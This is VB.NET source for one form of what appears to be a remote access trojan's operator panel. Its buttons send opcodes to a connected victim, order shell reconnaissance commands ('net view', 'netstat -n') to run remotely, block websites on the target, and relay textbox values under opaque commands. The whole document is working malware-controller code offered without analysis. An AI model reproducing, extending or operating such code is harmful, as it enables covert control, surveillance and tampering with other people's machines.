

Public Class Form41
    Public xxx As Integer





    Private Sub Form41_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TabPage1.BackColor = Color.Black
    End Sub



    Private Sub AvButton4_Click(sender As Object, e As EventArgs) Handles AvButton4.Click
        Form1.S.Send(xxx, "ROps43H")
    End Sub

    Private Sub AvButton3_Click(sender As Object, e As EventArgs) Handles AvButton3.Click
        Form1.S.Send(xxx, "screamiwsx" & "|U|" & "net view")
        System.Threading.Thread.Sleep(200)
        Form1.S.Send(xxx, "screamiwsx" & "|U|" & "net view")
    End Sub


    Private Sub AvButton2_Click(sender As Object, e As EventArgs) Handles AvButton2.Click
        Form1.S.Send(xxx, "ROps43")
    End Sub

  
    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click
        Form1.S.Send(xxx, "screamiwsx" & "|U|" & "netstat -n")
        System.Threading.Thread.Sleep(200)
        Form1.S.Send(xxx, "screamiwsx" & "|U|" & "netstat -n")
    End Sub

    Private Sub AvButton5_Click(sender As Object, e As EventArgs) Handles AvButton5.Click
        Form1.S.Send(xxx, "RIDOX" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text)
        MsgBox("Success", MsgBoxStyle.Information)
        Me.Close()
    End Sub

  
    Private Sub AvButton6_Click(sender As Object, e As EventArgs) Handles AvButton6.Click
        Form1.S.Send(xxx, "Cnsl")
        MsgBox("The retrieval Defaults Success", MsgBoxStyle.Information)
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
        TextBox3.Text = TextBox3.Text.Replace("http://", "")
        TextBox3.Text = TextBox3.Text.Replace("https://", "")
        TextBox3.Text = TextBox3.Text.Replace("/", "")
        TextBox3.Text = TextBox3.Text.Replace("\", "")
    End Sub

    Private Sub AvButton7_Click(sender As Object, e As EventArgs) Handles AvButton7.Click
        System.Threading.Thread.Sleep(200)
        Form1.S.Send(xxx, "blokr" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub AvButton8_Click(sender As Object, e As EventArgs) Handles AvButton8.Click
        System.Threading.Thread.Sleep(200)
        Form1.S.Send(xxx, "blokron")
    End Sub
End Class